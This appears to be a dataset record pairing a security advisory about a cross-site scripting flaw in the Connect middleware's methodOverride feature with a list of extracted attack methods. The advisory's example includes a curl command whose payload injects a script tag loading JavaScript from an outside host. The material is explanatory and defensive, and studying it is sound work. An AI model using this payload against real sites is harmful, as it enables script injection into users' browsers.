{"description": "node-connect before 2.8.2 has cross site scripting in Sencha Labs Connect middleware (vulnerability due to incomplete fix for CVE-2013-7370)\n\n### Overview\nConnect is a stack of middleware that is executed in order in each request.\n\nThe \"methodOverride\" middleware allows the http post to override the method of the request with the value of the \"_method\" post key or with the header \"x-http-method-override\".\n\nBecause the user post input was not checked, req.method could contain any kind of value. Because the req.method did not match any common method VERB, connect answered with a 404 page containing the \"Cannot `[method]` `[url]`\" content. The method was not properly encoded for output in the browser.\n\n\n### Example:\n```\n~ curl \"localhost:3000\" -d \"_method=<script src=http://nodesecurity.io/xss.js></script>\"\nCannot <SCRIPT SRC=HTTP://NODESECURITY.IO/XSS.JS></SCRIPT> /\n```\n\n### Recommendation\n\nUpdate to the newest version of Connect or disable methodOverride. It is not possible to avoid the vulnerability if you have enabled this middleware in the top of your stack.\n\n### Credit:\nSergio Arcos", "methods": ["Used cross-site scripting (XSS) to inject malicious JavaScript code.", "Injected malicious JavaScript code via the \"methodOverride\" middleware in Connect middleware.", "Used user input to override the request method.", "Injected malicious code in the \"Cannot `[method]` `[url]`\" page content.", "Used a malicious JavaScript file (`xss.js`) hosted on a remote server (`nodesecurity.io`)."]}
